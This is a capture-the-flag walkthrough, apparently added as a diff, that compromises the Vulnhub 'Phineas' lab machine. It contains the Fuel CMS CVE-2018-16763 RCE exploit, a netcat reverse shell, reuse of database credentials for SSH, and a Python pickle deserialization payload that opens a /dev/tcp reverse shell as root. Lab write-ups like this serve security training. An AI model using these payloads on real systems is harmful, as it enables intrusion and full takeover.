@@ -1,0 +1,217 @@
+===== Thought from enumeration (see nmap and gobuster and nikto result) =======
+
+According to the result of gobuster, "/structure" is PHP web application built under The CodeIgniter framework as show in composer.json
+
+{
+	"description" : "The CodeIgniter framework",
+	"name" : "codeigniter/framework",
+	"license": "MIT",
+	"require": {
+		"php": ">=5.2.4"
+	},
+	"require-dev": {
+		"mikey179/vfsStream": "1.1.*"
+	}
+}
+
+Also there is fuel CMS runnig under "/structure"
+Ref for detecting fuel : https://unicornsec.com/home/tryhackme-ignite
+
+
+====Exploit (First Flag)=====
+
+After a look to this https://unicornsec.com/home/tryhackme-ignite
+
+I download the exploit from https://www.exploit-db.com/exploits/47138 and change this lines
+
+url = "http://127.0.0.1:8881" ==> url = "http://192.168.15.154/structure/index.php"
+
+proxy = {"http":"http://127.0.0.1:8080"} ==> #proxy = {"http":"http://127.0.0.1:8080"}
+r = requests.get(burp0_url, proxies=proxy) ==> r = requests.get(burp0_url) 
+
+root@black-sh:~/Vulnhub/Phineas# python exploit-fuel-RCE.py 
+cmd:ls
+systemREADME.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+
+<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
+
+<h4>A PHP Error was encountered</h4>
+
+And there is it, structure app is vulnerable to CVE-2018-16763
+
+to get a shell :
+** url encode of nc -e /bin/bash 192.168.15.130 4444 ==> nc%20-e%20%2Fbin%2Fbash%20192.168.15.130%204444
+
+
+root@black-sh:~/Vulnhub/Phineas# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.15.130] from (UNKNOWN) [192.168.15.154] 55058
+id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+
+I thought about using the credentials in fuel/application/config/database.php to connect to SSH since LinPeas didn't give me interesting result
+
+cat fuel/application/config/database.php
+
+*/
+$active_group = 'default';
+$query_builder = TRUE;
+
+$db['default'] = array(
+	'dsn'	=> '',
+	'hostname' => 'localhost',
+	'username' => 'anna',
+	'password' => 'H993hfkNNid5kk',
+	'database' => 'anna',
+	'dbdriver' => 'mysqli',
+	'dbprefix' => '',
+	'pconnect' => FALSE,
+	'db_debug' => (ENVIRONMENT !== 'production'),
+	'cache_on' => FALSE,
+	'cachedir' => '',
+	'char_set' => 'utf8',
+	'dbcollat' => 'utf8_general_ci',
+	'swap_pre' => '',
+	'encrypt' => FALSE,
+	'compress' => FALSE,
+	'stricton' => FALSE,
+	'failover' => array(),
+	'save_queries' => TRUE
+);
+
+
+root@black-sh:~/Vulnhub/Phineas# ssh anna@192.168.15.154
+The authenticity of host '192.168.15.154 (192.168.15.154)' can't be established.
+ECDSA key fingerprint is SHA256:1iDFrvBhm6okZBYf+uNGsEDNx4tHOOR98hRBXPGfqlY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.15.154' (ECDSA) to the list of known hosts.
+anna@192.168.15.154's password: 
+Last login: Sat Apr 10 01:36:28 2021 from 192.168.15.130
+[anna@phineas ~]$ ls -l
+total 0
+drwx------. 2 anna anna 22 Mar 31 05:34 Desktop
+drwx------. 2 anna anna  6 Mar 31 04:44 Documents
+drwx------. 2 anna anna  6 Mar 31 04:44 Downloads
+drwx------. 2 anna anna  6 Mar 31 04:44 Music
+drwx------. 2 anna anna  6 Mar 31 04:44 Pictures
+drwx------. 2 anna anna  6 Mar 31 04:44 Public
+drwx------. 2 anna anna  6 Mar 31 04:44 Templates
+drwx------. 2 anna anna  6 Mar 31 04:44 Videos
+drwxr-xr-x. 4 root root 80 Apr  1 03:38 web
+[anna@phineas ~]$ ls -a
+.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  .config  .dbus  Desktop  Documents  Downloads  .esd_auth  .ICEauthority  .local  .mozilla  Music  .mysql_history  Pictures  .pki  Public  .ssh  Templates  Videos  web
+[anna@phineas ~]$ cd Desktop/
+[anna@phineas Desktop]$ ls
+user.txt
+[anna@phineas Desktop]$ cat user.txt 
+c2Vpc2VtcHJlbmVsbWlvY3VvcmVtYW1tYQ
+
+======Privelege Escalation (2nd Flag)===========
+
+I run Pinleas nothing intersting found and pspy64s shows there is flask server running 
+
+2021/04/10 02:45:45 CMD: UID=0    PID=1170   | /bin/bash /root/run_flask.sh 
+
+run_flash.sh is run by root and port listen to is 5000 as it was predicted here :
+
+[anna@phineas ~]$ netstat -lnp | grep LISTEN
+(No info could be read for "-p": geteuid()=1001 but you should be root.)
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::111                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -   
+
+Under directory web, the app.py shows that the app is vulnerable to python deserialization vulnerability 
+
+[anna@phineas ~]$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  result.txt  Templates  Videos  web
+[anna@phineas ~]$ cd web/
+[anna@phineas web]$ ls
+app.py  app.pyc  __pycache__  python3-virtualenv
+[anna@phineas web]$ cat app
+cat: app: No such file or directory
+[anna@phineas web]$ cat app.py
+#!/usr/bin/python3
+
+import pickle
+import base64
+from flask import Flask, request
+
+app = Flask(__name__)
+
+
+@app.route("/heaven", methods=["POST"])
+def heaven():
+    data = base64.urlsafe_b64decode(request.form['awesome'])
+    pickle.loads(data)
+    return '', 204
+
+To access the web app I had to create SSH Tunneling from my attacking machine 
+
+root@black-sh:~/Vulnhub/Phineas# ssh -L 5000:localhost:5000 anna@192.168.15.154
+anna@192.168.15.154's password: 
+Last login: Sat Apr 10 02:12:27 2021 from 192.168.15.130
+[anna@phineas ~]$ curl -X POST http://localhost:5000/heaven
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+[anna@phineas ~]$ curl -X POST -d "awesome=1" http://localhost:5000/heaven
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+[anna@phineas ~]$ 
+
+To exploit this vulnerability, I used the script from https://davidhamann.de/2020/04/05/exploiting-python-pickle/ with slight modification to generate my payload as follow:
+
+root@black-sh:~/Vulnhub/Phineas# cat exploit.py 
+import pickle
+import base64
+import os
+
+class RCE(object):
+    def __reduce__(self):
+        return (os.system,("/bin/bash -i >& /dev/tcp/192.168.15.130/5555 0>&1",))
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.b64encode(pickled))
+
+root@black-sh:~/Vulnhub/Phineas# python exploit.py 
+Y3Bvc2l4CnN5c3RlbQpwMAooUycvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNS4xMzAvNTU1NSAwPiYxJwpwMQp0cDIKUnAzCi4=
+
+then used curl to send my payload
+curl -X POST -d "awesome=Y3Bvc2l4CnN5c3RlbQpwMAooUycvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNS4xMzAvNTU1NSAwPiYxJwpwMQp0cDIKUnAzCi4=" http://localhost:5000/heaven
+
+root@black-sh:~/Vulnhub/Phineas# nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [192.168.15.130] from (UNKNOWN) [192.168.15.154] 47958
+bash: no job control in this shell
+[root@phineas web]# cd /root
+cd /root
+[root@phineas root]# ls
+ls
+anaconda-ks.cfg
+initial-setup-ks.cfg
+root.txt
+run_flask.sh
+[root@phineas root]# cat root.txt;id;hostname;date
+cat root.txt;id;hostname;date
+YW5uYW1hcmlhbmljb3NhbnRpdml2ZSE
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+phineas
+Sat Apr 10 02:50:16 EDT 2021
+[root@phineas root]# 
